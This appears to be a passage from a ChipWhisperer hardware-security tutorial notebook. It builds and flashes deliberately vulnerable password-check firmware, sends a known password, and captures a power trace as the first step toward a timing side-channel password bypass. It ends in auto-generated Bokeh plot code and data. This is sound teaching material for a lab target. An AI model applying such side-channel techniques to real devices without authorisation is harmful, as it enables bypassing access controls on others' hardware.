
Timing Analysis with Power for Password Bypass
==============================================

Supported setups:

SCOPES:

-  OPENADC
-  CWNANO

PLATFORMS:

-  CWLITEARM
-  CWLITEXMEGA
-  CWNANO

This tutorial will introduce you to breaking devices by determining when
a device is performing certain operations. It will use a simple password
check, and demonstrate how to perform a basic power analysis.

Note this is not a prerequisite to the tutorial on breaking AES. You can
skip this tutorial if you wish to go ahead with the AES tutorial.


**In [1]:**

.. code:: ipython3

    SCOPETYPE = 'OPENADC'
    PLATFORM = 'CWLITEARM'
    CRYPTO_TARGET = 'NONE'

Firmware
--------

Like before, we'll need to setup our ``PLATFORM``, then build the
firmware:


**In [2]:**

.. code:: bash

    %%bash -s "$PLATFORM" "$CRYPTO_TARGET"
    cd ../hardware/victims/firmware/basic-passwdcheck
    make PLATFORM=$1 CRYPTO_TARGET=$2


**Out [2]:**



.. parsed-literal::

    rm -f -- basic-passwdcheck-CWLITEARM.hex
    rm -f -- basic-passwdcheck-CWLITEARM.eep
    rm -f -- basic-passwdcheck-CWLITEARM.cof
    rm -f -- basic-passwdcheck-CWLITEARM.elf
    rm -f -- basic-passwdcheck-CWLITEARM.map
    rm -f -- basic-passwdcheck-CWLITEARM.sym
    rm -f -- basic-passwdcheck-CWLITEARM.lss
    rm -f -- objdir/\*.o
    rm -f -- objdir/\*.lst
    rm -f -- basic-passwdcheck.s simpleserial.s stm32f3_hal.s stm32f3_hal_lowlevel.s stm32f3_sysmem.s
    rm -f -- basic-passwdcheck.d simpleserial.d stm32f3_hal.d stm32f3_hal_lowlevel.d stm32f3_sysmem.d
    rm -f -- basic-passwdcheck.i simpleserial.i stm32f3_hal.i stm32f3_hal_lowlevel.i stm32f3_sysmem.i
    .
    -------- begin --------
    arm-none-eabi-gcc (GNU Tools for Arm Embedded Processors 7-2018-q2-update) 7.3.1 20180622 (release) [ARM/embedded-7-branch revision 261907]
    Copyright (C) 2017 Free Software Foundation, Inc.
    This is free software; see the source for copying conditions.  There is NO
    warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
    
    .
    Compiling C: basic-passwdcheck.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_0 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/basic-passwdcheck.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/basic-passwdcheck.o.d basic-passwdcheck.c -o objdir/basic-passwdcheck.o 
    .
    Compiling C: .././simpleserial/simpleserial.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_0 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/simpleserial.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/simpleserial.o.d .././simpleserial/simpleserial.c -o objdir/simpleserial.o 
    .
    Compiling C: .././hal/stm32f3/stm32f3_hal.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_0 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f3_hal.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/stm32f3_hal.o.d .././hal/stm32f3/stm32f3_hal.c -o objdir/stm32f3_hal.o 
    .
    Compiling C: .././hal/stm32f3/stm32f3_hal_lowlevel.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_0 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f3_hal_lowlevel.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/stm32f3_hal_lowlevel.o.d .././hal/stm32f3/stm32f3_hal_lowlevel.c -o objdir/stm32f3_hal_lowlevel.o 
    .
    Compiling C: .././hal/stm32f3/stm32f3_sysmem.c
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_0 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/stm32f3_sysmem.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/stm32f3_sysmem.o.d .././hal/stm32f3/stm32f3_sysmem.c -o objdir/stm32f3_sysmem.o 
    .
    Assembling: .././hal/stm32f3/stm32f3_startup.S
    arm-none-eabi-gcc -c -mcpu=cortex-m4 -I. -x assembler-with-cpp -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -DF_CPU=7372800 -Wa,-gstabs,-adhlns=objdir/stm32f3_startup.lst -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ .././hal/stm32f3/stm32f3_startup.S -o objdir/stm32f3_startup.o
    .
    Linking: basic-passwdcheck-CWLITEARM.elf
    arm-none-eabi-gcc -mcpu=cortex-m4 -I. -mthumb -mfloat-abi=hard -mfpu=fpv4-sp-d16 -fmessage-length=0 -ffunction-sections -gdwarf-2 -DSS_VER=SS_VER_1_0 -DSTM32F303xC -DSTM32F3 -DSTM32 -DDEBUG -DHAL_TYPE=HAL_stm32f3 -DPLATFORM=CWLITEARM -DF_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/basic-passwdcheck.o -I.././simpleserial/ -I.././hal -I.././hal/stm32f3 -I.././hal/stm32f3/CMSIS -I.././hal/stm32f3/CMSIS/core -I.././hal/stm32f3/CMSIS/device -I.././hal/stm32f4/Legacy -I.././crypto/ -std=gnu99 -MMD -MP -MF .dep/basic-passwdcheck-CWLITEARM.elf.d objdir/basic-passwdcheck.o objdir/simpleserial.o objdir/stm32f3_hal.o objdir/stm32f3_hal_lowlevel.o objdir/stm32f3_sysmem.o objdir/stm32f3_startup.o --output basic-passwdcheck-CWLITEARM.elf --specs=nano.specs -T .././hal/stm32f3/LinkerScript.ld -Wl,--gc-sections -lm -Wl,-Map=basic-passwdcheck-CWLITEARM.map,--cref   -lm  
    .
    Creating load file for Flash: basic-passwdcheck-CWLITEARM.hex
    arm-none-eabi-objcopy -O ihex -R .eeprom -R .fuse -R .lock -R .signature basic-passwdcheck-CWLITEARM.elf basic-passwdcheck-CWLITEARM.hex
    .
    Creating load file for EEPROM: basic-passwdcheck-CWLITEARM.eep
    arm-none-eabi-objcopy -j .eeprom --set-section-flags=.eeprom="alloc,load" \
    	--change-section-lma .eeprom=0 --no-change-warnings -O ihex basic-passwdcheck-CWLITEARM.elf basic-passwdcheck-CWLITEARM.eep || exit 0
    .
    Creating Extended Listing: basic-passwdcheck-CWLITEARM.lss
    arm-none-eabi-objdump -h -S -z basic-passwdcheck-CWLITEARM.elf > basic-passwdcheck-CWLITEARM.lss
    .
    Creating Symbol Table: basic-passwdcheck-CWLITEARM.sym
    arm-none-eabi-nm -n basic-passwdcheck-CWLITEARM.elf > basic-passwdcheck-CWLITEARM.sym
    Size after:
       text	   data	    bss	    dec	    hex	filename
       5232	    108	   1188	   6528	   1980	basic-passwdcheck-CWLITEARM.elf
    +--------------------------------------------------------
    + Built for platform CW-Lite Arm (STM32F3)
    +--------------------------------------------------------





.. parsed-literal::

    .././simpleserial/simpleserial.c: In function 'simpleserial_get':
    .././simpleserial/simpleserial.c:131:10: warning: variable 'ret' set but not used [-Wunused-but-set-variable]
      uint8_t ret[1];
              ^~~



Setup
-----

Setup is the same as usual, except this time we'll be capturing 2000
traces.


**In [3]:**

.. code:: ipython3

    %run "Helper_Scripts/Setup_Generic.ipynb"


**In [4]:**

.. code:: ipython3

    fw_path = '../hardware/victims/firmware/basic-passwdcheck/basic-passwdcheck-{}.hex'.format(PLATFORM)


**In [5]:**

.. code:: ipython3

    cw.program_target(scope, prog, fw_path)


**Out [5]:**



.. parsed-literal::

    Detected known STMF32: STM32F302xB(C)/303xB(C)
    Extended erase (0x44), this can take ten seconds or more
    Attempting to program 5339 bytes at 0x8000000
    STM32F Programming flash...
    STM32F Reading flash...
    Verified flash OK, 5339 bytes
    


Communicating With The Target
-----------------------------

As was mentioned at the beginning of the tutorial, the firmware we
loaded onto the target implements a basic password check. After getting
a ``'\n'`` terminated password, the target checks it and enters an
infinite loop, so before communicating with it, we'll need to reset it.

We'll be doing this a lot, so we'll define a function that resets the
target (this function is also available by running
"Helper\_Scripts/Setup.ipynb" as we did above):


**In [6]:**

.. code:: ipython3

    import time
    def reset_target(scope):
        if PLATFORM == "CW303" or PLATFORM == "CWLITEXMEGA":
            scope.io.pdic = 'low'
            time.sleep(0.05)
            scope.io.pdic = 'high'
            time.sleep(0.05)
        else:  
            scope.io.nrst = 'low'
            time.sleep(0.05)
            scope.io.nrst = 'high'
            time.sleep(0.05)

The target sends some text to us upon starting. After running the block
below, you should see some text appear.

**NOTE** The text may appear cutoff, accompanied by a message about data
loss. This means that the buffer used to store serial data (128 bytes)
from the target is full. This isn't an issue here, since the text is
just aesthetic, but keep this in mind if you want to do large transfers
of serial data using ChipWhisperer.


**In [7]:**

.. code:: ipython3

    ret = ""
    reset_target(scope)
    
    num_char = target.in_waiting()
    while num_char > 0:
        ret += target.read(timeout=10)
        time.sleep(0.05)
        num_char = target.in_waiting()
        
    print(ret)


**Out [7]:**



.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

     \*\*\*\*\*Safe-o-matic 3000 Booting...
    Aligning bits........[DONE]
    Checking Cesium RNG..[DONE]
    Masquerading flash...[DONE]
    Decrypti
    
    WARNING: UNAUTHORIZED ACCESS WILL BE PUNISHED
    Please enter password to continue: 
    


Now we can send the target a password:


**In [8]:**

.. code:: ipython3

    target.flush()
    target.write("h0px3\n")

And get the response. We sent it the right password (hopx3), so you
should see "Access granted, Welcome!":


**In [9]:**

.. code:: ipython3

    print(target.read(timeout=100))


**Out [9]:**



.. parsed-literal::

    Access granted, Welcome!
    
    


**tip**

In real systems, you may often know one of the passwords, which is
sufficient to investigate the password checking routines as we will do.
You also normally have an ability to reset passwords to default. While
the reset procedure would erase any data you care about, the attacker
will be able to use this 'sacrificial' device to learn about possible
vulnerabilities. So the assumption that we have access to the password
is really just saying we have access to a password, and will use that
knowledge to break the system in general.

Recording Traces
----------------

Now that we can communicate with our super-secure system, our next goal
is to get a power trace while the target is running. To do this, we'll
arm the scope just before we send our password attempt, then record the
trace as we've done before.


**In [10]:**

.. code:: ipython3

    if PLATFORM == "CWNANO":
        scope.adc.samples = 800
    else:
        scope.adc.samples = 2000


**In [11]:**

.. code:: ipython3

    ret = ""
    reset_target(scope)
    num_char = target.in_waiting()
    while num_char > 0:
        ret += target.read(timeout=10)
        time.sleep(0.01)
        num_char = target.in_waiting()
        
    print(ret)
    scope.arm()
    target.flush()
    target.write("h0px3\n")
    ret = scope.capture()
    if ret:
        print('Timeout happened during acquisition')
            
    trace = scope.get_last_trace()
    resp = ""
    num_char = target.in_waiting()
    while num_char > 0:
        resp += target.read(timeout=10)
        time.sleep(0.01)
        num_char = target.in_waiting()
    print(resp)


**Out [11]:**



.. parsed-literal::

    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    WARNING:root:SAM3U Serial buffers OVERRUN - data loss has occurred.
    




.. parsed-literal::

     \*\*\*\*\*Safe-o-matic 3000 Booting...
    Aligning bits........[DONE]
    Checking Cesium RNG..[DONE]
    Masquerading flash...[DONE]
    DecryptiNG: UNAUTHORIZED ACCESS WILL BE PUNISHED
    Please enter password to continue: 
    Access granted, Welcome!
    
    


Now that we have a trace, we'll use bokeh to plot it:


**In [12]:**

.. code:: ipython3

    from bokeh.plotting import figure, show 
    from bokeh.io import output_notebook
    from bokeh.models import CrosshairTool
    
    output_notebook()
    p = figure()
    x_range = range(0, len(trace))
    p.line(x_range, trace)
    show(p)


**Out [12]:**


.. raw:: html

    <div class="data_html">
        
        <div class="bk-root">
            <a href="https://bokeh.pydata.org" target="_blank" class="bk-logo bk-logo-small bk-logo-notebook"></a>
            <span id="1001">Loading BokehJS ...</span>
        </div>
    </div>



.. raw:: html

    

    <div id="0a0e9d17-ebef-4e2e-b2e7-45df50986090"></div>
    <div class="output_subarea output_javascript ">
    <script type="text/javascript">
    var element = $('#0a0e9d17-ebef-4e2e-b2e7-45df50986090');
        
    (function(root) {
      function now() {
        return new Date();
      }
    
      var force = true;
    
      if (typeof root._bokeh_onload_callbacks === "undefined" || force === true) {
        root._bokeh_onload_callbacks = [];
        root._bokeh_is_loading = undefined;
      }
    
      var JS_MIME_TYPE = 'application/javascript';
      var HTML_MIME_TYPE = 'text/html';
      var EXEC_MIME_TYPE = 'application/vnd.bokehjs_exec.v0+json';
      var CLASS_NAME = 'output_bokeh rendered_html';
    
      /**
       * Render data to the DOM node
       */
      function render(props, node) {
        var script = document.createElement("script");
        node.appendChild(script);
      }
    
      /**
       * Handle when an output is cleared or removed
       */
      function handleClearOutput(event, handle) {
        var cell = handle.cell;
    
        var id = cell.output_area._bokeh_element_id;
        var server_id = cell.output_area._bokeh_server_id;
        // Clean up Bokeh references
        if (id != null && id in Bokeh.index) {
          Bokeh.index[id].model.document.clear();
          delete Bokeh.index[id];
        }
    
        if (server_id !== undefined) {
          // Clean up Bokeh references
          var cmd = "from bokeh.io.state import curstate; print(curstate().uuid_to_server['" + server_id + "'].get_sessions()[0].document.roots[0]._id)";
          cell.notebook.kernel.execute(cmd, {
            iopub: {
              output: function(msg) {
                var id = msg.content.text.trim();
                if (id in Bokeh.index) {
                  Bokeh.index[id].model.document.clear();
                  delete Bokeh.index[id];
                }
              }
            }
          });
          // Destroy server and session
          var cmd = "import bokeh.io.notebook as ion; ion.destroy_server('" + server_id + "')";
          cell.notebook.kernel.execute(cmd);
        }
      }
    
      /**
       * Handle when a new output is added
       */
      function handleAddOutput(event, handle) {
        var output_area = handle.output_area;
        var output = handle.output;
    
        // limit handleAddOutput to display_data with EXEC_MIME_TYPE content only
        if ((output.output_type != "display_data") || (!output.data.hasOwnProperty(EXEC_MIME_TYPE))) {
          return
        }
    
        var toinsert = output_area.element.find("." + CLASS_NAME.split(' ')[0]);
    
        if (output.metadata[EXEC_MIME_TYPE]["id"] !== undefined) {
          toinsert[toinsert.length - 1].firstChild.textContent = output.data[JS_MIME_TYPE];
          // store reference to embed id on output_area
          output_area._bokeh_element_id = output.metadata[EXEC_MIME_TYPE]["id"];
        }
        if (output.metadata[EXEC_MIME_TYPE]["server_id"] !== undefined) {
          var bk_div = document.createElement("div");
          bk_div.innerHTML = output.data[HTML_MIME_TYPE];
          var script_attrs = bk_div.children[0].attributes;
          for (var i = 0; i < script_attrs.length; i++) {
            toinsert[toinsert.length - 1].firstChild.setAttribute(script_attrs[i].name, script_attrs[i].value);
          }
          // store reference to server id on output_area
          output_area._bokeh_server_id = output.metadata[EXEC_MIME_TYPE]["server_id"];
        }
      }
    
      function register_renderer(events, OutputArea) {
    
        function append_mime(data, metadata, element) {
          // create a DOM node to render to
          var toinsert = this.create_output_subarea(
            metadata,
            CLASS_NAME,
            EXEC_MIME_TYPE
          );
          this.keyboard_manager.register_events(toinsert);
          // Render to node
          var props = {data: data, metadata: metadata[EXEC_MIME_TYPE]};
          render(props, toinsert[toinsert.length - 1]);
          element.append(toinsert);
          return toinsert
        }
    
        /* Handle when an output is cleared or removed */
        events.on('clear_output.CodeCell', handleClearOutput);
        events.on('delete.Cell', handleClearOutput);
    
        /* Handle when a new output is added */
        events.on('output_added.OutputArea', handleAddOutput);
    
        /**
         * Register the mime type and append_mime function with output_area
         */
        OutputArea.prototype.register_mime_type(EXEC_MIME_TYPE, append_mime, {
          /* Is output safe? */
          safe: true,
          /* Index of renderer in `output_area.display_order` */
          index: 0
        });
      }
    
      // register the mime type if in Jupyter Notebook environment and previously unregistered
      if (root.Jupyter !== undefined) {
        var events = require('base/js/events');
        var OutputArea = require('notebook/js/outputarea').OutputArea;
    
        if (OutputArea.prototype.mime_types().indexOf(EXEC_MIME_TYPE) == -1) {
          register_renderer(events, OutputArea);
        }
      }
    
      
      if (typeof (root._bokeh_timeout) === "undefined" || force === true) {
        root._bokeh_timeout = Date.now() + 5000;
        root._bokeh_failed_load = false;
      }
    
      var NB_LOAD_WARNING = {'data': {'text/html':
         "<div style='background-color: #fdd'>\n"+
         "<p>\n"+
         "BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \n"+
         "may be due to a slow or bad network connection. Possible fixes:\n"+
         "</p>\n"+
         "<ul>\n"+
         "<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\n"+
         "<li>use INLINE resources instead, as so:</li>\n"+
         "</ul>\n"+
         "<code>\n"+
         "from bokeh.resources import INLINE\n"+
         "output_notebook(resources=INLINE)\n"+
         "</code>\n"+
         "</div>"}};
    
      function display_loaded() {
        var el = document.getElementById("1001");
        if (el != null) {
          el.textContent = "BokehJS is loading...";
        }
        if (root.Bokeh !== undefined) {
          if (el != null) {
            el.textContent = "BokehJS " + root.Bokeh.version + " successfully loaded.";
          }
        } else if (Date.now() < root._bokeh_timeout) {
          setTimeout(display_loaded, 100)
        }
      }
    
    
      function run_callbacks() {
        try {
          root._bokeh_onload_callbacks.forEach(function(callback) {
            if (callback != null)
              callback();
          });
        } finally {
          delete root._bokeh_onload_callbacks
        }
        console.debug("Bokeh: all callbacks have finished");
      }
    
      function load_libs(css_urls, js_urls, callback) {
        if (css_urls == null) css_urls = [];
        if (js_urls == null) js_urls = [];
    
        root._bokeh_onload_callbacks.push(callback);
        if (root._bokeh_is_loading > 0) {
          console.debug("Bokeh: BokehJS is being loaded, scheduling callback at", now());
          return null;
        }
        if (js_urls == null || js_urls.length === 0) {
          run_callbacks();
          return null;
        }
        console.debug("Bokeh: BokehJS not loaded, scheduling load and callback at", now());
        root._bokeh_is_loading = css_urls.length + js_urls.length;
    
        function on_load() {
          root._bokeh_is_loading--;
          if (root._bokeh_is_loading === 0) {
            console.debug("Bokeh: all BokehJS libraries/stylesheets loaded");
            run_callbacks()
          }
        }
    
        function on_error() {
          console.error("failed to load " + url);
        }
    
        for (var i = 0; i < css_urls.length; i++) {
          var url = css_urls[i];
          const element = document.createElement("link");
          element.onload = on_load;
          element.onerror = on_error;
          element.rel = "stylesheet";
          element.type = "text/css";
          element.href = url;
          console.debug("Bokeh: injecting link tag for BokehJS stylesheet: ", url);
          document.body.appendChild(element);
        }
    
        for (var i = 0; i < js_urls.length; i++) {
          var url = js_urls[i];
          var element = document.createElement('script');
          element.onload = on_load;
          element.onerror = on_error;
          element.async = false;
          element.src = url;
          console.debug("Bokeh: injecting script tag for BokehJS library: ", url);
          document.head.appendChild(element);
        }
      };var element = document.getElementById("1001");
      if (element == null) {
        console.error("Bokeh: ERROR: autoload.js configured with elementid '1001' but no matching script tag was found. ")
        return false;
      }
    
      function inject_raw_css(css) {
        const element = document.createElement("style");
        element.appendChild(document.createTextNode(css));
        document.body.appendChild(element);
      }
    
      var js_urls = ["https://cdn.pydata.org/bokeh/release/bokeh-1.2.0.min.js", "https://cdn.pydata.org/bokeh/release/bokeh-widgets-1.2.0.min.js", "https://cdn.pydata.org/bokeh/release/bokeh-tables-1.2.0.min.js", "https://cdn.pydata.org/bokeh/release/bokeh-gl-1.2.0.min.js"];
      var css_urls = ["https://cdn.pydata.org/bokeh/release/bokeh-1.2.0.min.css", "https://cdn.pydata.org/bokeh/release/bokeh-widgets-1.2.0.min.css", "https://cdn.pydata.org/bokeh/release/bokeh-tables-1.2.0.min.css"];
    
      var inline_js = [
        function(Bokeh) {
          Bokeh.set_log_level("info");
        },
        
        function(Bokeh) {
          
        },
        function(Bokeh) {} // ensure no trailing comma for IE
      ];
    
      function run_inline_js() {
        
        if ((root.Bokeh !== undefined) || (force === true)) {
          for (var i = 0; i < inline_js.length; i++) {
            inline_js[i].call(root, root.Bokeh);
          }if (force === true) {
            display_loaded();
          }} else if (Date.now() < root._bokeh_timeout) {
          setTimeout(run_inline_js, 100);
        } else if (!root._bokeh_failed_load) {
          console.log("Bokeh: BokehJS failed to load within specified timeout.");
          root._bokeh_failed_load = true;
        } else if (force !== true) {
          var cell = $(document.getElementById("1001")).parents('.cell').data().cell;
          cell.output_area.append_execute_result(NB_LOAD_WARNING)
        }
    
      }
    
      if (root._bokeh_is_loading === 0) {
        console.debug("Bokeh: BokehJS loaded, going straight to plotting");
        run_inline_js();
      } else {
        load_libs(css_urls, js_urls, function() {
          console.debug("Bokeh: BokehJS plotting callback run at", now());
          run_inline_js();
        });
      }
    }(window));
    </script>
    </div>


.. raw:: html

    <div class="data_html">
        
    
    
    
    
    
      <div class="bk-root" id="0f06e2d3-ee94-47b0-857a-08e0e1152128" data-root-id="1002"></div>
    
    </div>



.. raw:: html

    

    <div id="8bdb810b-6a50-42fc-a12d-9a464a72dcb6"></div>
    <div class="output_subarea output_javascript ">
    <script type="text/javascript">
    var element = $('#8bdb810b-6a50-42fc-a12d-9a464a72dcb6');
        (function(root) {
      function embed_document(root) {
        
      var docs_json = {"e1c9bd12-67fe-479b-a450-b05f9a35e4c9":{"roots":{"references":[{"attributes":{"below":[{"id":"1011","type":"LinearAxis"}],"center":[{"id":"1015","type":"Grid"},{"id":"1020","type":"Grid"}],"left":[{"id":"1016","type":"LinearAxis"}],"renderers":[{"id":"1037","type":"GlyphRenderer"}],"title":{"id":"1039","type":"Title"},"toolbar":{"id":"1027","type":"Toolbar"},"x_range":{"id":"1003","type":"DataRange1d"},"x_scale":{"id":"1007","type":"LinearScale"},"y_range":{"id":"1005","type":"DataRange1d"},"y_scale":{"id":"1009","type":"LinearScale"}},"id":"1002","subtype":"Figure","type":"Plot"},{"attributes":{},"id":"1009","type":"LinearScale"},{"attributes":{"formatter":{"id":"1042","type":"BasicTickFormatter"},"ticker":{"id":"1012","type":"BasicTicker"}},"id":"1011","type":"LinearAxis"},{"attributes":{},"id":"1017","type":"BasicTicker"},{"attributes":{},"id":"1012","type":"BasicTicker"},{"attributes":{"ticker":{"id":"1012","type":"BasicTicker"}},"id":"1015","type":"Grid"},{"attributes":{"dimension":1,"ticker":{"id":"1017","type":"BasicTicker"}},"id":"1020","type":"Grid"},{"attributes":{"formatter":{"id":"1044","type":"BasicTickFormatter"},"ticker":{"id":"1017","type":"BasicTicker"}},"id":"1016","type":"LinearAxis"},{"attributes":{"source":{"id":"1034","type":"ColumnDataSource"}},"id":"1038","type":"CDSView"},{"attributes":{"active_drag":"auto","active_inspect":"auto","active_multi":null,"active_scroll":"auto","active_tap":"auto","tools":[{"id":"1021","type":"PanTool"},{"id":"1022","type":"WheelZoomTool"},{"id":"1023","type":"BoxZoomTool"},{"id":"1024","type":"SaveTool"},{"id":"1025","type":"ResetTool"},{"id":"1026","type":"HelpTool"}]},"id":"1027","type":"Toolbar"},{"attributes":{},"id":"1021","type":"PanTool"},{"attributes":{},"id":"1022","type":"WheelZoomTool"},{"attributes":{"callback":null,"data":{"x":[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359,360,361,362,363,364,365,366,367,368,369,370,371,372,373,374,375,376,377,378,379,380,381,382,383,384,385,386,387,388,389,390,391,392,393,394,395,396,397,398,399,400,401,402,403,404,405,406,407,408,409,410,411,412,413,414,415,416,417,418,419,420,421,422,423,424,425,426,427,428,429,430,431,432,433,434,435,436,437,438,439,440,441,442,443,444,445,446,447,448,449,450,451,452,453,454,455,456,457,458,459,460,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,476,477,478,479,480,481,482,483,484,485,486,487,488,489,490,491,492,493,494,495,496,497,498,499,500,501,502,503,504,505,506,507,508,509,510,511,512,513,514,515,516,517,518,519,520,521,522,523,524,525,526,527,528,529,530,531,532,533,534,535,536,537,538,539,540,541,542,543,544,545,546,547,548,549,550,551,552,553,554,555,556,557,558,559,560,561,562,563,564,565,566,567,568,569,570,571,572,573,574,575,576,577,578,579,580,581,582,583,584,585,586,587,588,589,590,591,592,593,594,595,596,597,598,599,600,601,602,603,604,605,606,607,608,609,610,611,612,613,614,615,616,617,618,619,620,621,622,623,624,625,626,627,628,629,630,631,632,633,634,635,636,637,638,639,640,641,642,643,644,645,646,647,648,649,650,651,652,653,654,655,656,657,658,659,660,661,662,663,664,665,666,667,668,669,670,671,672,673,674,675,676,677,678,679,680,681,682,683,684,685,686,687,688,689,690,691,692,693,694,695,696,697,698,699,700,701,702,703,704,705,706,707,708,709,710,711,712,713,714,715,716,717,718,719,720,721,722,723,724,725,726,727,728,729,730,731,732,733,734,735,736,737,738,739,740,741,742,743,744,745,746,747,748,749,750,751,752,753,754,755,756,757,758,759,760,761,762,763,764,765,766,767,768,769,770,771,772,773,774,775,776,777,778,779,780,781,782,783,784,785,786,787,788,789,790,791,792,793,794,795,796,797,798,799,800,801,802,803,804,805,806,807,808,809,810,811,812,813,814,815,816,817,818,819,820,821,822,823,824,825,826,827,828,829,830,831,832,833,834,835,836,837,838,839,840,841,842,843,844,845,846,847,848,849,850,851,852,853,854,855,856,857,858,859,860,861,862,863,864,865,866,867,868,869,870,871,872,873,874,875,876,877,878,879,880,881,882,883,884,885,886,887,888,889,890,891,892,893,894,895,896,897,898,899,900,901,902,903,904,905,906,907,908,909,910,911,912,913,914,915,916,917,918,919,920,921,922,923,924,925,926,927,928,929,930,931,932,933,934,935,936,937,938,939,940,941,942,943,944,945,946,947,948,949,950,951,952,953,954,955,956,957,958,959,960,961,962,963,964,965,966,967,968,969,970,971,972,973,974,975,976,977,978,979,980,981,982,983,984,985,986,987,988,989,990,991,992,993,994,995,996,997,998,999,1000,1001,1002,1003,1004,1005,1006,1007,1008,1009,1010,1011,1012,1013,1014,1015,1016,1017,1018,1019,1020,1021,1022,1023,1024,